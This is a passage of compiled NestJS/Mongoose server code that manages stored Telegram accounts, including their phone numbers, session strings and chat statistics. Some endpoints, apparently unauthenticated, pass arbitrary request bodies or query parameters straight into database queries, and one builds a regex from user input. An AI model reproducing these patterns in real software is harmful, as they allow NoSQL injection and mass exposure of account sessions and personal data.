    __metadata("design:type", String)
], ActiveChannel.prototype, "username", void 0);
__decorate([
    (0, mongoose_1.Prop)({ type: mongoose.Schema.Types.Number, default: 0 }),
    __metadata("design:type", Number)
], ActiveChannel.prototype, "wordRestriction", void 0);
__decorate([
    (0, mongoose_1.Prop)({ type: mongoose.Schema.Types.Number, default: 0 }),
    __metadata("design:type", Number)
], ActiveChannel.prototype, "dMRestriction", void 0);
__decorate([
    (0, mongoose_1.Prop)({ type: [String], default: [] }),
    __metadata("design:type", Array)
], ActiveChannel.prototype, "availableMsgs", void 0);
__decorate([
    (0, mongoose_1.Prop)({ type: [String], default: [] }),
    __metadata("design:type", Array)
], ActiveChannel.prototype, "reactions", void 0);
__decorate([
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "banned", void 0);
__decorate([
    (0, mongoose_1.Prop)({ default: true }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "megagroup", void 0);
__decorate([
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], ActiveChannel.prototype, "reactRestricted", void 0);
exports.ActiveChannel = ActiveChannel = __decorate([
    (0, mongoose_1.Schema)({ collection: 'activeChannels', versionKey: false, autoIndex: true }) // Specify the collection name here
], ActiveChannel);
exports.ActiveChannelSchema = mongoose_1.SchemaFactory.createForClass(ActiveChannel);


/***/ }),

/***/ "./nest/components/buffer-clients/buffer-client.controller.ts":
/*!********************************************************************!*\
  !*** ./nest/components/buffer-clients/buffer-client.controller.ts ***!
  \********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BufferClientController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const buffer_client_service_1 = __webpack_require__(/*! ./buffer-client.service */ "./nest/components/buffer-clients/buffer-client.service.ts");
const create_buffer_client_dto_1 = __webpack_require__(/*! ./dto/create-buffer-client.dto */ "./nest/components/buffer-clients/dto/create-buffer-client.dto.ts");
const search_buffer__client_dto_1 = __webpack_require__(/*! ./dto/search-buffer- client.dto */ "./nest/components/buffer-clients/dto/search-buffer- client.dto.ts");
let BufferClientController = class BufferClientController {
    constructor(clientService) {
        this.clientService = clientService;
    }
    create(createClientDto) {
        return __awaiter(this, void 0, void 0, function* () {
            return this.clientService.create(createClientDto);
        });
    }
    search(query) {
        return __awaiter(this, void 0, void 0, function* () {
            return this.clientService.search(query);
        });
    }
    findAll() {
        return __awaiter(this, void 0, void 0, function* () {
            return this.clientService.findAll();
        });
    }
    findOne(bufferClientId) {
        return __awaiter(this, void 0, void 0, function* () {
            return this.clientService.findOne(bufferClientId);
        });
    }
    update(bufferClientId, updateClientDto) {
        return __awaiter(this, void 0, void 0, function* () {
            return this.clientService.update(bufferClientId, updateClientDto);
        });
    }
    remove(bufferClientId) {
        return __awaiter(this, void 0, void 0, function* () {
            return this.clientService.remove(bufferClientId);
        });
    }
    executeQuery(query) {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                return yield this.clientService.executeQuery(query);
            }
            catch (error) {
                throw error; // You might want to handle errors more gracefully
            }
        });
    }
};
exports.BufferClientController = BufferClientController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create user data' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_buffer_client_dto_1.CreateBufferClientDto]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "create", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search user data' }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_buffer__client_dto_1.SearchBufferClientDto]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "search", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all user data' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)(':bufferClientId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' }),
    __param(0, (0, common_1.Param)('bufferClientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':bufferClientId'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
    __param(0, (0, common_1.Param)('bufferClientId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':bufferClientId'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete user data by ID' }),
    __param(0, (0, common_1.Param)('bufferClientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "remove", null);
__decorate([
    (0, common_1.Post)('query'),
    (0, swagger_1.ApiOperation)({ summary: 'Execute a custom MongoDB query' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], BufferClientController.prototype, "executeQuery", null);
exports.BufferClientController = BufferClientController = __decorate([
    (0, swagger_1.ApiTags)('Buffer Clients'),
    (0, common_1.Controller)('bufferclients'),
    __metadata("design:paramtypes", [buffer_client_service_1.BufferClientService])
], BufferClientController);


/***/ }),

/***/ "./nest/components/buffer-clients/buffer-client.module.ts":
/*!****************************************************************!*\
  !*** ./nest/components/buffer-clients/buffer-client.module.ts ***!
  \****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BufferClientModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const buffer_client_service_1 = __webpack_require__(/*! ./buffer-client.service */ "./nest/components/buffer-clients/buffer-client.service.ts");
const buffer_client_controller_1 = __webpack_require__(/*! ./buffer-client.controller */ "./nest/components/buffer-clients/buffer-client.controller.ts");
const user_schema_1 = __webpack_require__(/*! ../users/schemas/user.schema */ "./nest/components/users/schemas/user.schema.ts");
let BufferClientModule = class BufferClientModule {
};
exports.BufferClientModule = BufferClientModule;
exports.BufferClientModule = BufferClientModule = __decorate([
    (0, common_1.Module)({
        imports: [mongoose_1.MongooseModule.forFeature([{ name: 'bufferClientModule', schema: user_schema_1.UserSchema, collection: 'bufferClients' }])],
        controllers: [buffer_client_controller_1.BufferClientController],
        providers: [buffer_client_service_1.BufferClientService],
        exports: [buffer_client_service_1.BufferClientService]
    })
], BufferClientModule);


/***/ }),

/***/ "./nest/components/buffer-clients/buffer-client.service.ts":
/*!*****************************************************************!*\
  !*** ./nest/components/buffer-clients/buffer-client.service.ts ***!
  \*****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BufferClientService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
let BufferClientService = class BufferClientService {
    constructor(bufferClientModel) {
        this.bufferClientModel = bufferClientModel;
    }
    create(bufferClient) {
        return __awaiter(this, void 0, void 0, function* () {
            const newUser = new this.bufferClientModel(bufferClient);
            return newUser.save();
        });
    }
    findAll() {
        return __awaiter(this, void 0, void 0, function* () {
            return this.bufferClientModel.find().exec();
        });
    }
    findOne(tgId) {
        return __awaiter(this, void 0, void 0, function* () {
            const user = yield this.bufferClientModel.findOne({ tgId }).exec();
            if (!user) {
                throw new common_1.NotFoundException(`User with tgId ${tgId} not found`);
            }
            return user;
        });
    }
    update(tgId, user) {
        return __awaiter(this, void 0, void 0, function* () {
            delete user['_id'];
            const existingUser = yield this.bufferClientModel.findOneAndUpdate({ tgId }, { $set: user }, { new: true }).exec();
            if (!existingUser) {
                throw new common_1.NotFoundException(`User with tgId ${tgId} not found`);
            }
            return existingUser;
        });
    }
    remove(tgId) {
        return __awaiter(this, void 0, void 0, function* () {
            const result = yield this.bufferClientModel.deleteOne({ tgId }).exec();
            if (result.deletedCount === 0) {
                throw new common_1.NotFoundException(`User with tgId ${tgId} not found`);
            }
        });
    }
    search(filter) {
        return __awaiter(this, void 0, void 0, function* () {
            console.log(filter);
            if (filter.firstName) {
                filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
            }
            console.log(filter);
            return this.bufferClientModel.find(filter).exec();
        });
    }
    executeQuery(query) {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                if (!query) {
                    throw new common_1.BadRequestException('Query is invalid.');
                }
                return yield this.bufferClientModel.find(query).exec();
            }
            catch (error) {
                throw new common_1.InternalServerErrorException(error.message);
            }
        });
    }
};
exports.BufferClientService = BufferClientService;
exports.BufferClientService = BufferClientService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('bufferClientModule')),
    __metadata("design:paramtypes", [mongoose_2.Model])
], BufferClientService);


/***/ }),

/***/ "./nest/components/buffer-clients/dto/create-buffer-client.dto.ts":
/*!************************************************************************!*\
  !*** ./nest/components/buffer-clients/dto/create-buffer-client.dto.ts ***!
  \************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateBufferClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateBufferClientDto {
}
exports.CreateBufferClientDto = CreateBufferClientDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Mobile number of the user', example: '917330803480' }),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Session information of the user', example: 'string' }),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'First name of the user', example: 'Praveen' }),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "firstName", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Last name of the user', example: null }),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "lastName", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Username of the user', example: null }),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "userName", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of channels', example: 56 }),
    __metadata("design:type", Number)
], CreateBufferClientDto.prototype, "channels", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of personal chats', example: 74 }),
    __metadata("design:type", Number)
], CreateBufferClientDto.prototype, "personalChats", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Boolean flag indicating if demo was given', example: false }),
    __metadata("design:type", Boolean)
], CreateBufferClientDto.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of messages', example: 0 }),
    __metadata("design:type", Number)
], CreateBufferClientDto.prototype, "msgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Total number of chats', example: 195 }),
    __metadata("design:type", Number)
], CreateBufferClientDto.prototype, "totalChats", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Timestamp of last active', example: 1718260523 }),
    __metadata("design:type", Number)
], CreateBufferClientDto.prototype, "lastActive", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Date of creation in YYYY-MM-DD format', example: '2024-06-03' }),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "date", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Telegram ID of the user', example: '2022068676' }),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Timestamp of last update', example: '2024-06-13' }),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "lastUpdated", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of movies', example: 0 }),
    __metadata("design:type", Number)
], CreateBufferClientDto.prototype, "movieCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of photos', example: 0 }),
    __metadata("design:type", Number)
], CreateBufferClientDto.prototype, "photoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of videos', example: 0 }),
    __metadata("design:type", Number)
], CreateBufferClientDto.prototype, "videoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Gender of the user', example: null }),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "gender", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Username of the user', example: null }),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of other photos', example: 0 }),
    __metadata("design:type", Number)
], CreateBufferClientDto.prototype, "otherPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of other videos', example: 0 }),
    __metadata("design:type", Number)
], CreateBufferClientDto.prototype, "otherVideoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of own photos', example: 0 }),
    __metadata("design:type", Number)
], CreateBufferClientDto.prototype, "ownPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of own videos', example: 0 }),
    __metadata("design:type", Number)
], CreateBufferClientDto.prototype, "ownVideoCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of contacts', example: 105 }),
    __metadata("design:type", Number)
], CreateBufferClientDto.prototype, "contacts", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Call details of the user',
        example: {
            outgoing: 1,
            incoming: 0,
            video: 1,
            chatCallCounts: [],
            totalCalls: 1,
        },
    }),
    __metadata("design:type", Object)
], CreateBufferClientDto.prototype, "calls", void 0);


/***/ }),

/***/ "./nest/components/buffer-clients/dto/search-buffer- client.dto.ts":
/*!*************************************************************************!*\
  !*** ./nest/components/buffer-clients/dto/search-buffer- client.dto.ts ***!
  \*************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchBufferClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class SearchBufferClientDto {
}
exports.SearchBufferClientDto = SearchBufferClientDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Mobile number of the user', example: '917330803480' }),
    __metadata("design:type", String)
], SearchBufferClientDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Session information of the user', example: 'string' }),
    __metadata("design:type", String)
], SearchBufferClientDto.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'First name of the user', example: 'Praveen' }),
    __metadata("design:type", String)
], SearchBufferClientDto.prototype, "firstName", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Last name of the user', example: null }),
    __metadata("design:type", String)
], SearchBufferClientDto.prototype, "lastName", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Username of the user', example: null }),
    __metadata("design:type", String)
], SearchBufferClientDto.prototype, "userName", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Number of channels', example: 56 }),
    __metadata("design:type", Number)
], SearchBufferClientDto.prototype, "channels", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Number of personal chats', example: 74 }),
    __metadata("design:type", Number)
], SearchBufferClientDto.prototype, "personalChats", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Boolean flag indicating if demo was given', example: false }),
    __metadata("design:type", Boolean)
], SearchBufferClientDto.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Number of messages', example: 0 }),
    __metadata("design:type", Number)
], SearchBufferClientDto.prototype, "msgs", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Total number of chats', example: 195 }),
    __metadata("design:type", Number)
], SearchBufferClientDto.prototype, "totalChats", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Timestamp of last active', example: 1718260523 }),
    __metadata("design:type", Number)
], SearchBufferClientDto.prototype, "lastActive", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Date of creation in YYYY-MM-DD format', example: '2024-06-03' }),
    __metadata("design:type", String)
], SearchBufferClientDto.prototype, "date", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Telegram ID of the user', example: '2022068676' }),
    __metadata("design:type", String)
], SearchBufferClientDto.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Timestamp of last update', example: '2024-06-13' }),
    __metadata("design:type", String)
], SearchBufferClientDto.prototype, "lastUpdated", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Number of movies', example: 0 }),
    __metadata("design:type", Number)
], SearchBufferClientDto.prototype, "movieCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Number of photos', example: 0 }),
    __metadata("design:type", Number)
], SearchBufferClientDto.prototype, "photoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Number of videos', example: 0 }),
    __metadata("design:type", Number)
], SearchBufferClientDto.prototype, "videoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Gender of the user', example: null }),
    __metadata("design:type", String)
], SearchBufferClientDto.prototype, "gender", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Username of the user', example: null }),
    __metadata("design:type", String)
], SearchBufferClientDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Number of other photos', example: 0 }),
    __metadata("design:type", Number)
], SearchBufferClientDto.prototype, "otherPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Number of other videos', example: 0 }),
    __metadata("design:type", Number)
], SearchBufferClientDto.prototype, "otherVideoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Number of own photos', example: 0 }),
    __metadata("design:type", Number)
], SearchBufferClientDto.prototype, "ownPhotoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Number of own videos', example: 0 }),
    __metadata("design:type", Number)
], SearchBufferClientDto.prototype, "ownVideoCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Number of contacts', example: 105 }),
    __metadata("design:type", Number)
], SearchBufferClientDto.prototype, "contacts", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Call details of the user',
        example: {
            outgoing: 1,
            incoming: 0,
            video: 1,
            chatCallCounts: [],
            totalCalls: 1,
        },
    }),
    __metadata("design:type", Object)
], SearchBufferClientDto.prototype, "calls", void 0);


/***/ }),

/***/ "./nest/components/clients/client.controller.ts":
/*!******************************************************!*\
  !*** ./nest/components/clients/client.controller.ts ***!
  \******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ClientController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const client_service_1 = __webpack_require__(/*! ./client.service */ "./nest/components/clients/client.service.ts");
const create_client_dto_1 = __webpack_require__(/*! ./dto/create-client.dto */ "./nest/components/clients/dto/create-client.dto.ts");
const search_client_dto_1 = __webpack_require__(/*! ./dto/search-client.dto */ "./nest/components/clients/dto/search-client.dto.ts");
let ClientController = class ClientController {
    constructor(clientService) {
        this.clientService = clientService;
    }
    create(createClientDto) {
        return __awaiter(this, void 0, void 0, function* () {
            return this.clientService.create(createClientDto);
        });
    }
    search(query) {
        return __awaiter(this, void 0, void 0, function* () {
            return this.clientService.search(query);
        });
    }
    findAll() {
        return __awaiter(this, void 0, void 0, function* () {
            return this.clientService.findAll();
        });
    }
    findOne(clientId) {
        return __awaiter(this, void 0, void 0, function* () {
            return this.clientService.findOne(clientId);
        });
    }
    update(clientId, updateClientDto) {
        return __awaiter(this, void 0, void 0, function* () {
            return this.clientService.update(clientId, updateClientDto);
        });
    }
    remove(clientId) {
        return __awaiter(this, void 0, void 0, function* () {
            return this.clientService.remove(clientId);
        });
    }
    executeQuery(query) {
        return __awaiter(this, void 0, void 0, function* () {
            try {
                return yield this.clientService.executeQuery(query);
            }
            catch (error) {
                throw error; // You might want to handle errors more gracefully
            }
        });
    }
};
exports.ClientController = ClientController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create user data' })
    //@apiresponse({ status: 201, description: 'The user data has been successfully created.' })
    //@apiresponse({ status: 403, description: 'Forbidden.' })
    ,
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_client_dto_1.CreateClientDto]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "create", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search user data' })
    //@apiresponse({ status: 200, description: 'Return the searched user data.' })
    ,
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_client_dto_1.SearchClientDto]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "search", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all user data' })
    //@apiresponse({ status: 200, description: 'Return all user data.' })
    //@apiresponse({ status: 403, description: 'Forbidden.' })
    ,
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)(':clientId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' })
    //@apiresponse({ status: 200, description: 'Return the user data.' })
    //@apiresponse({ status: 404, description: 'User data not found.' })
    ,
    __param(0, (0, common_1.Param)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':clientId'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' })
    //@apiresponse({ status: 200, description: 'The user data has been successfully updated.' })
    //@apiresponse({ status: 404, description: 'User data not found.' })
    ,
    __param(0, (0, common_1.Param)('clientId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':clientId'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete user data by ID' })
    //@apiresponse({ status: 200, description: 'The user data has been successfully deleted.' })
    //@apiresponse({ status: 404, description: 'User data not found.' })
    ,
    __param(0, (0, common_1.Param)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "remove", null);
__decorate([
    (0, common_1.Post)('query'),
    (0, swagger_1.ApiOperation)({ summary: 'Execute a custom MongoDB query' })
    //@apiresponse({ status: 200, description: 'Query executed successfully.' })
    //@apiresponse({ status: 400, description: 'Invalid query.' })
    //@apiresponse({ status: 500, description: 'Internal server error.' })
    ,
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "executeQuery", null);
exports.ClientController = ClientController = __decorate([
    (0, swagger_1.ApiTags)('Clients'),
